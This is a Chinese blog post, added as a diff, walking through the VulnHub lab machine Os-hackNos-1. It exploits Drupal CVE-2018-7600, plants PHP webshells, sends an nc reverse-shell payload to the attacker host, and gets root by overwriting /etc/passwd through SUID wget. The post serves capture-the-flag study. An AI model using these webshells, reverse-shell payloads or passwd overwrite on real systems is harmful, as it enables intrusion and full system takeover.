@@ -1,0 +1,297 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Os-hackNos-1 | Life lover</title><meta name="author" content="bilibiliganb"><meta name="copyright" content="bilibiliganb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Os-hackNos-1靶机下载 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hacknos-os-hacknos,401 目标为 普通用户的user.txt和root用户的root.txt 靶机配置在将靶机文件下载下来为Os-hackNos-1.ova 使用vm打开这个ova文件进行导入。导入完成后，若是遇到无法获取ip地址，则需要在启动界面点击shift进入如下界面按下e  1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Os-hackNos-1">
+<meta property="og:url" content="https://bilibiliganb.github.io/project/2023/10/19/Os-hackNos-1/index.html">
+<meta property="og:site_name" content="Life lover">
+<meta property="og:description" content="Os-hackNos-1靶机下载 https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;hacknos-os-hacknos,401 目标为 普通用户的user.txt和root用户的root.txt 靶机配置在将靶机文件下载下来为Os-hackNos-1.ova 使用vm打开这个ova文件进行导入。导入完成后，若是遇到无法获取ip地址，则需要在启动界面点击shift进入如下界面按下e  1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bilibiliganb.github.io/project/img/avatar.png">
+<meta property="article:published_time" content="2023-10-19T10:10:06.000Z">
+<meta property="article:modified_time" content="2023-10-19T10:10:06.094Z">
+<meta property="article:author" content="bilibiliganb">
+<meta property="article:tag" content="sec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bilibiliganb.github.io/project/img/avatar.png"><link rel="shortcut icon" href="/project/img/favicon.png"><link rel="canonical" href="https://bilibiliganb.github.io/project/2023/10/19/Os-hackNos-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/project/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/project/',
+  algolia: undefined,
+  localSearch: {"path":"/project/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Os-hackNos-1',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-19 18:10:06'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/project/atom.xml" title="Life lover" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/project/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/project/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/project/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/project/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/project/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/project/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/project/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 类别</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/project/range/"><i class="fa-fw fa-music"></i><span> 靶場</span></a></li><li><a class="site-page child" href="/project/tools/"><i class="fa-fw fa-tools"></i><span> 工具</span></a></li><li><a class="site-page child" href="/project/study/"><i class="fa-fw fa-study"></i><span> 技能学习</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/project/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/project/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/project/" title="Life lover"><span class="site-name">Life lover</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/project/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/project/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/project/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 类别</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/project/range/"><i class="fa-fw fa-music"></i><span> 靶場</span></a></li><li><a class="site-page child" href="/project/tools/"><i class="fa-fw fa-tools"></i><span> 工具</span></a></li><li><a class="site-page child" href="/project/study/"><i class="fa-fw fa-study"></i><span> 技能学习</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/project/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/project/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Os-hackNos-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-19T10:10:06.000Z" title="发表于 2023-10-19 18:10:06">2023-10-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-19T10:10:06.094Z" title="更新于 2023-10-19 18:10:06">2023-10-19</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Os-hackNos-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Os-hackNos-1"><a href="#Os-hackNos-1" class="headerlink" title="Os-hackNos-1"></a>Os-hackNos-1</h1><p>靶机下载 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401">https://www.vulnhub.com/entry/hacknos-os-hacknos,401</a></p>
+<p>目标为 普通用户的<strong>user.txt</strong>和root用户的<strong>root.txt</strong></p>
+<h2 id="靶机配置"><a href="#靶机配置" class="headerlink" title="靶机配置"></a>靶机配置</h2><p>在将靶机文件下载下来为Os-hackNos-1.ova</p>
+<p>使用vm打开这个ova文件进行导入。导入完成后，若是遇到无法获取ip地址，则需要在启动界面点击shift进入如下界面按下e</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628231828025.png" alt="image-20230628231828025"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">向下翻动，将ro改为rw single init=/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628231856200.png" alt="image-20230628231856200"></p>
+<p>然后按下 ctrl+x进入shell</p>
+<p>使用ip a查看ip地址</p>
+<p>若发现无ip地址，则记住网卡名称，这里是ens33</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628231909760.png" alt="image-20230628231909760"></p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
+
+<p>对网卡信息进行编辑</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628231926804.png" alt="image-20230628231926804"></p>
+<p>如果在使用vim &#x2F;etc&#x2F;network&#x2F;interfaces没有如上信息，则需要重新导入ova，即删掉此虚拟机，重新使用vm打开ova并导入。</p>
+<p>使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
+
+<p>进行网卡重启</p>
+<p>若是返回networking没找到此命令，证明ova导入时文件缺失，需要重新导入ova。</p>
+<h2 id="进行渗透"><a href="#进行渗透" class="headerlink" title="进行渗透"></a>进行渗透</h2><p>靶机和kali在同一个网段。</p>
+<p>使用nmap对此网段进行扫描</p>
+<p>nmap 192.168.5.0&#x2F;24 -O </p>
+<p>其中靶机的信息如下 </p>
+<p>Nmap scan report for 192.168.5.132<br>Host is up (0.00047s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE<br>22&#x2F;tcp open  ssh<br>80&#x2F;tcp open  http<br>MAC Address: 00:0C:29:B0:11:06 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop</p>
+<p>其中80端口开启了</p>
+<p><strong>则这里靶机ip地址为192.168.5.132</strong></p>
+<p>故存在网页，则使用dirsearch进行目录扫描</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628231946258.png" alt="image-20230628231946258"></p>
+<p>发现<a target="_blank" rel="noopener" href="http://192.168.5.132/drupal/%E5%B9%B6%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE">http://192.168.5.132/drupal/并进行访问</a></p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232004225.png" alt="image-20230628232004225"></p>
+<p>通过 <a target="_blank" rel="noopener" href="http://192.168.0.142/drupal/CHANGELOG.txt">http://192.168.0.142/drupal/CHANGELOG.txt</a> 得知grupal的版本为 Drupal 7.57</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232023925.png" alt="image-20230628232023925"></p>
+<p>在百度等搜索引擎中搜索该版本的漏洞，找到CVE-2018-7600</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232037744.png" alt="image-20230628232037744"></p>
+<p>在github中下载该漏洞的exp</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pimps/CVE-2018-7600">https://github.com/pimps/CVE-2018-7600</a></p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/pimps/CVE-2018-7600.git">https://github.com/pimps/CVE-2018-7600.git</a></p>
+<p>在kali中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">python3 drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls</span><br></pre></td></tr></table></figure>
+
+<p>即可执行ls读取文件</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232052599.png" alt="image-20230628232052599"></p>
+<p>在当前目录写一个一句话木马</p>
+<p>这里参考的moonsec的</p>
+<p>moon.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_POST[&#x27;moon&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里写自己的webshell</p>
+<p>php.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;qwer&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后者可以通过菜刀之类的webshell工具进行连接</p>
+<p>这里用哥斯拉进行连接</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232108952.png" alt="image-20230628232108952"></p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232130003.png" alt="image-20230628232130003"></p>
+<p>或者采用第一种(即moon的方式)进行反弹shell</p>
+<p>然后在当前目录开启python自带的httpserver</p>
+<p>python -m SimpleHTTPServer</p>
+<p>然后使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c &quot;wget http://192.168.5.129:8000/moon.php&quot;   </span><br></pre></td></tr></table></figure>
+
+<p>将php文件上传到靶机上</p>
+<p>再使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls</span><br></pre></td></tr></table></figure>
+
+<p>查看php木马是否上传成功</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232146849.png" alt="image-20230628232146849"></p>
+<p>首先在kali中使用nc进行监听</p>
+<p>nc -lvnp 9000</p>
+<p>在浏览器中访问<a target="_blank" rel="noopener" href="http://192.168.5.132/drupal/moon.php">http://192.168.5.132/drupal/moon.php</a></p>
+<p>使用burp进行抓包准备反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /drupal/moon.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.5.132</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: has_js=1</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 91</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">moon=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash++2&gt;%261|nc+192.168.5.129+9000+&gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+
+
+<p>注意这里的 192.168.5.129为kali的ip地址</p>
+<p>moon博客里写的是&#x2F;bin&#x2F;sh -i 但是我在测试时报错了</p>
+<p>rm+&#x2F;tmp&#x2F;f%3bmkfifo+&#x2F;tmp&#x2F;f%3bcat+&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh+‐i+2&gt;%261|nc+192.168.0.136+9001+&gt;&#x2F;tmp&#x2F;f</p>
+<p>我这里改为 &#x2F;bin&#x2F;bash</p>
+<p>moon&#x3D;rm+&#x2F;tmp&#x2F;f%3bmkfifo+&#x2F;tmp&#x2F;f%3bcat+&#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash++2&gt;%261|nc+192.168.5.129+9000+&gt;&#x2F;tmp&#x2F;f</p>
+<p>提交之后可以反弹一个shell</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232204943.png" alt="image-20230628232204943"></p>
+<p>此时已经反弹成功</p>
+<p>然后切换为python3的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232226022.png" alt="image-20230628232226022"></p>
+<p>在网站根目录发现一个<strong>alexander.txt</strong></p>
+<p>使用cat获取其内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackNos:/var/www/html/drupal$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">www-data@hackNos:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">alexander.txt  drupal  index.html</span><br><span class="line">www-data@hackNos:/var/www/html$ cat alexander.txt</span><br><span class="line">cat alexander.txt</span><br><span class="line">KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>凭借经验看出这是base64加密的数据，将其使用base64解密</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232243956.png" alt="image-20230628232243956"></p>
+<p>然后发现左边是Brainfuck</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232301143.png" alt="image-20230628232301143"></p>
+<p>解密网站如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.splitbrain.org/services/ook</span><br></pre></td></tr></table></figure>
+
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232314924.png" alt="image-20230628232314924"></p>
+<p>点击右下角Brainfuck to text即可解密</p>
+<p>得到james:hacker@4514</p>
+<p>通过查找，在home中找到james和其目录下的user.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackNos:/home/james$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">   _                                  </span><br><span class="line">  | |                                 </span><br><span class="line"> / __) ______  _   _  ___   ___  _ __ </span><br><span class="line"> \__ \|______|| | | |/ __| / _ \| &#x27;__|</span><br><span class="line"> (   /        | |_| |\__ \|  __/| |   </span><br><span class="line">  |_|          \__,_||___/ \___||_|   </span><br><span class="line">                                      </span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>试着提权，先看看suid提权，需要搜索到，带有s的文件，开始查找。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232332862.png" alt="image-20230628232332862"></p>
+<p>发现wget普通用户也可执行</p>
+<p>那么提权的方式就是通过下载目标靶机上的passwd，然后构造一个有root权限的用户加入到构造的passwd文件中，然后使用wget -O将内容重定向输入到&#x2F;etc&#x2F;passwd中</p>
+<p>首先通过cat &#x2F;etc&#x2F;passwd获取靶机密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">www-data@hackNos:/var/www/html/drupal$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">james:x:1000:1000:james,,,:/home/james:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">moon:$1$moon$8F2YI9c3zhkkS9SOsKawY0:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>复制到本地生成文件passwd</p>
+<p>在kali中生成密码</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232349133.png" alt="image-20230628232349133"></p>
+<p>将moon加入到伪造的passwd，并赋予root权限</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232408828.png" alt="image-20230628232408828"></p>
+<p>将passwd放到开启了python  httpserver的文件夹中</p>
+<p>然后使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c &quot;wget http://192.168.5.129:8000/passwd -O /etc/passwd&quot;  </span><br></pre></td></tr></table></figure>
+
+<p>或者直接在已有的shell中进行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.5.129:8000/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>然后在已有的shell中进行切换用户</p>
+<p><img src="/project/2023/10/19/Os-hackNos-1/image-20230628232454442.png" alt="image-20230628232454442"></p>
